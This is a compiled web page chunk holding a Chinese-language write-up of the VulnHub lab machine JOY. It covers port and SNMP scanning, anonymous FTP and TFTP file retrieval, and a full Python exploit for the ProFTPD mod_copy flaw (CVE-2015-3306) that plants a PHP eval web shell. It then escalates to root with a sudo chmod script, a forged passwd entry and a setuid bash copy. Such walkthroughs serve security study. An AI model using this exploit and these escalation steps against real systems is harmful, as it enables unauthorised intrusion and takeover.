"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[9877],{7755:(r,n,e)=>{e.r(n),e.d(n,{assets:()=>p,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"VulnHub/Virtual Machines/JOY","title":"JOY","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/JOY.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/JOY","permalink":"/docs/VulnHub/Virtual Machines/JOY","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/JOY.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"HackLAB Vulnix","permalink":"/docs/VulnHub/Virtual Machines/HackLAB Vulnix"},"next":{"title":"Kioptrix Level 1.1","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix Level 1.1"}}');var s=e(4848),o=e(8453);const a={},i=void 0,p={},c=[{value:"port scan",id:"port-scan",level:2},{value:"ftp",id:"ftp",level:2},{value:"snmp\u534f\u8bae",id:"snmp\u534f\u8bae",level:2},{value:"tftp",id:"tftp",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function l(r){const n={code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...r.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"port-scan",children:"port scan"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Mon Feb  3 03:37:49 2025 as: nmap -sT --min-rate 10000 -p- -oN nmap_result/port 192.168.28.21\r\nNmap scan report for 192.168.28.21 (192.168.28.21)\r\nHost is up (0.00024s latency).\r\nNot shown: 65523 closed tcp ports (conn-refused)\r\nPORT    STATE SERVICE\r\n21/tcp  open  ftp\r\n22/tcp  open  ssh\r\n25/tcp  open  smtp\r\n80/tcp  open  http\r\n110/tcp open  pop3\r\n139/tcp open  netbios-ssn\r\n143/tcp open  imap\r\n445/tcp open  microsoft-ds\r\n465/tcp open  smtps\r\n587/tcp open  submission\r\n993/tcp open  imaps\r\n995/tcp open  pop3s\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Mon Feb  3 03:38:42 2025 as: nmap -p21,22,25,80,110,139,143,445,465,587,993,995 -sVC -O -oN nmap_result/detils 192.168.28.21\r\nNmap scan report for 192.168.28.21 (192.168.28.21)\r\nHost is up (0.00057s latency).\r\n\r\nPORT    STATE SERVICE     VERSION\r\n21/tcp  open  ftp         ProFTPD\r\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r\n| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download\r\n|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload\r\n22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)\r\n25/tcp  open  smtp        Postfix smtpd\r\n| ssl-cert: Subject: commonName=JOY\r\n| Subject Alternative Name: DNS:JOY\r\n| Not valid before: 2018-12-23T14:29:24\r\n|_Not valid after:  2028-12-20T14:29:24\r\n|_ssl-date: TLS randomness does not represent time\r\n|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8\r\n80/tcp  open  http        Apache httpd 2.4.25 ((Debian))\r\n|_http-server-header: Apache/2.4.25 (Debian)\r\n|_http-title: Index of /\r\n| http-ls: Volume /\r\n| SIZE  TIME              FILENAME\r\n| -     2016-07-19 20:03  ossec/\r\n|_\r\n110/tcp open  pop3        Dovecot pop3d\r\n|_pop3-capabilities: SASL TOP CAPA RESP-CODES UIDL STLS AUTH-RESP-CODE PIPELINING\r\n| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG\r\n| Not valid before: 2019-01-27T17:23:23\r\n|_Not valid after:  2032-10-05T17:23:23\r\n|_ssl-date: TLS randomness does not represent time\r\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r\n143/tcp open  imap        Dovecot imapd\r\n| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG\r\n| Not valid before: 2019-01-27T17:23:23\r\n|_Not valid after:  2032-10-05T17:23:23\r\n|_ssl-date: TLS randomness does not represent time\r\n|_imap-capabilities: more Pre-login have LOGIN-REFERRALS STARTTLS post-login ENABLE LOGINDISABLEDA0001 capabilities SASL-IR listed OK IMAP4rev1 LITERAL+ IDLE ID\r\n445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)\r\n465/tcp open  smtp        Postfix smtpd\r\n|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8\r\n|_ssl-date: TLS randomness does not represent time\r\n| ssl-cert: Subject: commonName=JOY\r\n| Subject Alternative Name: DNS:JOY\r\n| Not valid before: 2018-12-23T14:29:24\r\n|_Not valid after:  2028-12-20T14:29:24\r\n587/tcp open  smtp        Postfix smtpd\r\n|_ssl-date: TLS randomness does not represent time\r\n| ssl-cert: Subject: commonName=JOY\r\n| Subject Alternative Name: DNS:JOY\r\n| Not valid before: 2018-12-23T14:29:24\r\n|_Not valid after:  2028-12-20T14:29:24\r\n|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8\r\n993/tcp open  ssl/imap    Dovecot imapd\r\n| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG\r\n| Not valid before: 2019-01-27T17:23:23\r\n|_Not valid after:  2032-10-05T17:23:23\r\n|_ssl-date: TLS randomness does not represent time\r\n|_imap-capabilities: Pre-login more LOGIN-REFERRALS have post-login ENABLE ID capabilities SASL-IR listed OK LITERAL+ IMAP4rev1 IDLE AUTH=PLAINA0001\r\n995/tcp open  ssl/pop3    Dovecot pop3d\r\n|_ssl-date: TLS randomness does not represent time\r\n| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG\r\n| Not valid before: 2019-01-27T17:23:23\r\n|_Not valid after:  2032-10-05T17:23:23\r\n|_pop3-capabilities: SASL(PLAIN) TOP CAPA RESP-CODES UIDL PIPELINING AUTH-RESP-CODE USER\r\nMAC Address: 00:0C:29:DE:1F:04 (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: Hosts: The,  JOY.localdomain, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nHost script results:\r\n| smb-os-discovery: \r\n|   OS: Windows 6.1 (Samba 4.5.12-Debian)\r\n|   Computer name: joy\r\n|   NetBIOS computer name: JOY\\x00\r\n|   Domain name: \\x00\r\n|   FQDN: joy\r\n|_  System time: 2025-02-03T16:38:56+08:00\r\n| smb2-security-mode: \r\n|   3:1:1: \r\n|_    Message signing enabled but not required\r\n| smb-security-mode: \r\n|   account_used: guest\r\n|   authentication_level: user\r\n|   challenge_response: supported\r\n|_  message_signing: disabled (dangerous, but default)\r\n|_nbstat: NetBIOS name: JOY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\r\n|_clock-skew: mean: -2h39m59s, deviation: 4h37m07s, median: 0s\r\n| smb2-time: \r\n|   date: 2025-02-03T08:38:56\r\n|_  start_date: N/A\n"})}),"\n",(0,s.jsx)(n.p,{children:"ftp,ssh,smb,smtp,http\u670d\u52a1\u5b58\u5728"}),"\n",(0,s.jsx)(n.h2,{id:"ftp",children:"ftp"}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u533f\u540d\u767b\u5f55"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"ftp> cd upload\r\n250 CWD command successful\r\nftp> ls\r\n229 Entering Extended Passive Mode (|||52242|)\r\n150 Opening ASCII mode data connection for file list\r\n-rwxrwxr-x   1 ftp      ftp         23357 Feb  3 17:27 directory\r\n-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo\r\n-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado\r\n-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado\r\n-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio\r\n-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo\r\n-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo\r\n-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo\r\n-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano\r\n-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo\r\n-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho\r\n-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento\r\n-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho\r\n-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko\r\n-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto\r\n-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno\r\n-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino\r\n-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto\r\n-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo\r\n-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo\r\n-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder\r\n226 Transfer complete\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6587\u4ef6\u5168\u90e8\u4e0b\u8f7d\u4e0b\u6765"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"ftp> prompt\r\nInteractive mode off.\r\nftp> mget *\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6216\u8005"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"wget -m ftp://anonymous:anonymous@192.168.28.21\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u67e5\u770b\u6587\u4ef6",(0,s.jsx)(n.code,{children:"directory"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u2514\u2500$ cat upload/directory \r\nPatrick's Directory\r\n\r\ntotal 132\r\n-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_control\r\ndrwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos\r\n\r\nYou should know where the directory can be accessed.\r\n\r\nInformation of this Machine!\r\n\r\nLinux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Patrick\u76ee\u5f55\u6709\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"version_control"}),"\u6587\u4ef6\uff0c\u5e76\u63d0\u793a\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e2a\u76ee\u5f55"]}),"\n",(0,s.jsx)(n.p,{children:"web\u76ee\u5f55\u679a\u4e3e\u6ca1\u6709\u7ed3\u679c\uff0csmb\u65e0\u6cd5\u5229\u7528"}),"\n",(0,s.jsx)(n.p,{children:"\u626b\u63cfudp\u534f\u8bae\u670d\u52a1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"sudo nmap -sU --min-rate 10000 -p- 192.168.28.21\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"Nmap scan report for 192.168.28.21 (192.168.28.21)\r\nHost is up (0.0012s latency).\r\nNot shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)\r\nPORT    STATE SERVICE\r\n123/udp open  ntp\r\n137/udp open  netbios-ns\r\n161/udp open  snmp\r\nMAC Address: 00:0C:29:DE:1F:04 (VMware)\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"sudo nmap -sU -sVC -O -p123,137,161 192.168.28.21\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"PORT    STATE SERVICE    VERSION\r\n123/udp open  ntp        NTP v4 (secondary server)\r\n137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)\r\n| nbns-interfaces: \r\n|   hostname: JOY\r\n|   interfaces: \r\n|_    192.168.28.21\r\n161/udp open  snmp       SNMPv1 server; net-snmp SNMPv3 server (public)\r\n|_  System uptime: 1h11m38.18s (429818 timeticks)\r\n| snmp-netstat: \r\n|   TCP  0.0.0.0:21           0.0.0.0:0\r\n|   TCP  0.0.0.0:22           0.0.0.0:0\r\n|   TCP  0.0.0.0:25           0.0.0.0:0\r\n|   TCP  0.0.0.0:110          0.0.0.0:0\r\n|   TCP  0.0.0.0:139          0.0.0.0:0\r\n|   TCP  0.0.0.0:143          0.0.0.0:0\r\n|   TCP  0.0.0.0:445          0.0.0.0:0\r\n|   TCP  0.0.0.0:465          0.0.0.0:0\r\n|   TCP  0.0.0.0:587          0.0.0.0:0\r\n|   TCP  0.0.0.0:993          0.0.0.0:0\r\n|   TCP  0.0.0.0:995          0.0.0.0:0\r\n|   TCP  127.0.0.1:631        0.0.0.0:0\r\n|   TCP  127.0.0.1:3306       0.0.0.0:0\r\n|   UDP  0.0.0.0:68           *:*\r\n|   UDP  0.0.0.0:123          *:*\r\n|   UDP  0.0.0.0:137          *:*\r\n|   UDP  0.0.0.0:138          *:*\r\n|   UDP  0.0.0.0:161          *:*\r\n|   UDP  0.0.0.0:631          *:*\r\n|   UDP  0.0.0.0:1900         *:*\r\n|   UDP  0.0.0.0:5353         *:*\r\n|   UDP  0.0.0.0:34450        *:*\r\n|   UDP  0.0.0.0:36969        *:*\r\n|   UDP  0.0.0.0:52854        *:*\r\n|   UDP  127.0.0.1:123        *:*\r\n|   UDP  192.168.28.21:123    *:*\r\n|   UDP  192.168.28.21:137    *:*\r\n|   UDP  192.168.28.21:138    *:*\r\n|   UDP  192.168.28.255:137   *:*\r\n|_  UDP  192.168.28.255:138   *:*\r\n| snmp-interfaces: \r\n|   lo\r\n|     IP address: 127.0.0.1  Netmask: 255.0.0.0\r\n|     Type: softwareLoopback  Speed: 10 Mbps\r\n|     Traffic stats: 90.83 Kb sent, 90.83 Kb received\r\n|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)\r\n|     IP address: 192.168.28.21  Netmask: 255.255.255.0\r\n|     MAC address: 00:0c:29:de:1f:04 (VMware)\r\n|     Type: ethernetCsmacd  Speed: 1 Gbps\r\n|_    Traffic stats: 477.53 Mb sent, 148.57 Mb received\r\n| snmp-processes:\r\n|   773: \r\n|     Name: in.tftpd\r\n|     Path: /usr/sbin/in.tftpd\r\n|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick\n"})}),"\n",(0,s.jsx)(n.h2,{id:"snmp\u534f\u8bae",children:"snmp\u534f\u8bae"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"SNMP - \u7b80\u5355\u7f51\u7edc\u7ba1\u7406\u534f\u8bae"}),"\u662f\u4e00\u79cd\u7528\u4e8e\u76d1\u63a7\u7f51\u7edc\u4e2d\u4e0d\u540c\u8bbe\u5907\u7684\u534f\u8bae"]}),"\n",(0,s.jsx)(n.p,{children:"\u901a\u8fc7\u4e0a\u9762\u7ed3\u679c\uff0c\u53d1\u73b036969\u7aef\u53e3\u8fd0\u884c\u7740tftp\u670d\u52a1\uff0c\u5e76\u4e14\u6307\u5b9a\u4e3a/home/patrick\u5bb6\u76ee\u5f55"}),"\n",(0,s.jsx)(n.h3,{id:"tftp",children:"tftp"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/JOY]\r\n\u2514\u2500$ tftp 192.168.28.21 36969        \r\ntftp> get version_control\r\ntftp> get 123\r\nError code 1: File not found\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/JOY]\r\n\u2514\u2500$ cat version_control \r\nVersion Control of External-Facing Services:\r\n\r\nApache: 2.4.25\r\nDropbear SSH: 0.34\r\nProFTPd: 1.3.5\r\nSamba: 4.5.12\r\n\r\nWe should switch to OpenSSH and upgrade ProFTPd.\r\n\r\nNote that we have some other configurations in this machine.\r\n1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.\r\n2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7ed9\u51fa\u4e86\u4e00\u4e9b\u670d\u52a1\u7248\u672c\u4fe1\u606f\uff0c\u8fd8\u6709web\u7684\u6839\u76ee\u5f55\u662f",(0,s.jsx)(n.code,{children:"/var/www/tryingharderisjoy"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"searchsploit ProFTPd 1.3.5\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250204161657480.png",alt:"image-20250204161657480"})}),"\n",(0,s.jsx)(n.p,{children:"\u5b58\u5728rce\u6f0f\u6d1e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/env python\r\n# CVE-2015-3306 exploit by t0kx\r\n# https://github.com/t0kx/exploit-CVE-2015-3306\r\n\r\nimport re\r\nimport socket\r\nimport requests\r\nimport argparse\r\n\r\nclass Exploit:\r\n    def __init__(self, host, port, path):\r\n        self.__sock = None\r\n        self.__host = host\r\n        self.__port = port\r\n        self.__path = path\r\n\r\n    def __connect(self):\r\n        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        self.__sock.connect((self.__host, self.__port))\r\n        self.__sock.recv(1024)\r\n\r\n    def __exploit(self):\r\n        payload = "<?php eval($_POST[\'cmd\']); ?>"\r\n        self.__sock.send(b"site cpfr /proc/self/cmdline\\n")\r\n        self.__sock.recv(1024)\r\n        self.__sock.send(("site cpto /tmp/." + payload + "\\n").encode("utf-8"))\r\n        self.__sock.recv(1024)\r\n        self.__sock.send(("site cpfr /tmp/." + payload + "\\n").encode("utf-8"))\r\n        self.__sock.recv(1024)\r\n        self.__sock.send(("site cpto "+ self.__path +"/backdoor.php\\n").encode("utf-8"))\r\n\r\n        if "Copy successful" in str(self.__sock.recv(1024)):\r\n            print("[+] Target exploited, acessing shell at http://" + self.__host + "/backdoor.php")\r\n            print("[+] Done")\r\n        else:\r\n            print("[!] Failed")\r\n\r\n    def run(self):\r\n        self.__connect()\r\n        self.__exploit()\r\n\r\ndef main(args):\r\n    print("[+] CVE-2015-3306 exploit by t0kx")\r\n    print("[+] Exploiting " + args.host + ":" + args.port)\r\n\r\n    exploit = Exploit(args.host, int(args.port), args.path)\r\n    exploit.run()\r\n\r\nif __name__ == "__main__":\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\'--host\', required=True)\r\n    parser.add_argument(\'--port\', required=True)\r\n    parser.add_argument(\'--path\', required=True)\r\n    args = parser.parse_args()\r\n\r\n    main(args)\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/JOY]\r\n\u2514\u2500$ python3 exploit.py --host 192.168.28.21 --port 21 --path '/var/www/tryingharderisjoy'\r\n[+] CVE-2015-3306 exploit by t0kx\r\n[+] Exploiting 192.168.28.21:21\r\n[+] Target exploited, acessing shell at http://192.168.28.21/backdoor.php\r\n[+] Done\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6216\u8005\u624b\u52a8\u590d\u5236"}),"\n",(0,s.jsx)(n.p,{children:"\u9996\u5148\uff0cftp\u4e0a\u4f20php\u6587\u4ef6\uff0c\u7136\u540e\u5c06\u5b83\u590d\u5236\u5230web\u76ee\u5f55\u5373\u53ef"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/JOY]\r\n\u2514\u2500$ telnet 192.168.28.21 21\r\nTrying 192.168.28.21...\r\nConnected to 192.168.28.21.\r\nEscape character is '^]'.\r\n220 The Good Tech Inc. FTP Server\r\nsite cpfr /home/ftp/1.php\r\n350 File or directory exists, ready for destination name\r\nsite cpto /var/www/tryingharderisjoy/1.php\r\n250 Copy successful\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"telnet 192.168.28.21 21\r\nsite cpfr /home/ftp/1.php\r\nsite cpto /var/www/tryingharderisjoy/1.php\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,s.jsx)(n.p,{children:"web\u76ee\u5f55\u4e0b\u53d1\u73b0\u51ed\u636e"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"/var/www/tryingharderisjoy/ossec/patricksecretsofjoy"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"credentials for JOY:\r\npatrick:apollo098765\r\nroot:howtheheckdoiknowwhattherootpasswordis\r\n\r\nhow would these hack3rs ever find such a page?\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5207\u6362\u5230patrick"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"patrick@JOY:~$ sudo -l\r\nMatching Defaults entries for patrick on JOY:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser patrick may run the following commands on JOY:\r\n    (ALL) NOPASSWD: /home/patrick/script/test\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6709sudo\u6743\u9650"}),"\n",(0,s.jsxs)(n.p,{children:["\u4f46\u662fscript\u76ee\u5f55\u53ea\u80fdroot\u53ef\u4ee5\u67e5\u770b\uff0c\u7ecf\u8fc7\u5c1d\u8bd5\u7ed9",(0,s.jsx)(n.code,{children:"script"}),"\u76ee\u5f55\u6743\u9650"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"patrick@JOY:~$ sudo /home/patrick/script/test\r\nI am practising how to do simple bash scripting!\r\nWhat file would you like to change permissions within this directory?\r\n\r\nWhat permissions would you like to set the file to?\r\n777\r\nCurrently changing file permissions, please wait.\r\nTidying up...\r\nDone!\n"})}),"\n",(0,s.jsx)(n.p,{children:"test\u5185\u5bb9\u4e3a\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sh",children:'#!/bin/sh\r\n\r\necho "I am practising how to do simple bash scripting!"\r\nsleep 3\r\n\r\necho "What file would you like to change permissions within this directory?"\r\n\r\nread file\r\nsleep 3\r\n\r\necho "What permissions would you like to set the file to?"\r\n\r\nread permissions\r\nsleep 3\r\n\r\necho "Currently changing file permissions, please wait."\r\nsleep 3\r\n\r\nchmod $permissions /home/patrick/script/$file\r\necho "Tidying up..."\r\nsleep 3\r\n\r\necho "Done!"\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7../\uff0c\u7ed9\u4e00\u4e9b\u7279\u6b8a\u6587\u4ef6\u6743\u9650\uff08\u4f8b\u5982\uff1apasswd\uff0cshadow\uff0csudoers\u7b49\uff09"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"openssl passwd -1 -salt somesalt 123456 > hash.txt\r\ncorr:$1$somesalt$uGkN1R3BfqJr15hKXW5jt.:0:0::/root:/bin/bash\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@JOY:~# ls\r\nauthor-secret.txt      dovecot.crt  dovecot.key     proof.txt   rootCA.pem\r\ndocument-generator.sh  dovecot.csr  permissions.sh  rootCA.key  rootCA.srl\r\nroot@JOY:~# cat proof.txt \r\nNever grant sudo permissions on scripts that perform system functions!\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6216\u8005\u901a\u8fc7ftp\u8fdb\u884c\u4fee\u6539test\u6587\u4ef6\u63d0\u6743\uff0c\u6216\u8005\u76f4\u63a5\u7ed9test\u6587\u4ef6\u5199\u6743\u9650\uff0c\u4fee\u6539\u8be5\u6587\u4ef6\u5373\u53ef"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"patrick@JOY:~/script$ echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > test\r\npatrick@JOY:~/script$ cd /tmp\r\npatrick@JOY:/tmp$ ls\r\nbash\r\npatrick@JOY:/tmp$ ./bash -p\r\nbash-4.4# id\r\nuid=1000(patrick) gid=1000(patrick) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1000(patrick),1001(ftp)\n"})})]})}function d(r={}){const{wrapper:n}={...(0,o.R)(),...r.components};return n?(0,s.jsx)(n,{...r,children:(0,s.jsx)(l,{...r})}):l(r)}},8453:(r,n,e)=>{e.d(n,{R:()=>a,x:()=>i});var t=e(6540);const s={},o=t.createContext(s);function a(r){const n=t.useContext(o);return t.useMemo((function(){return"function"==typeof r?r(n):{...n,...r}}),[n,r])}function i(r){let n;return n=r.disableParentContext?"function"==typeof r.components?r.components(s):r.components||s:a(r.components),t.createElement(o.Provider,{value:n},r.children)}}}]);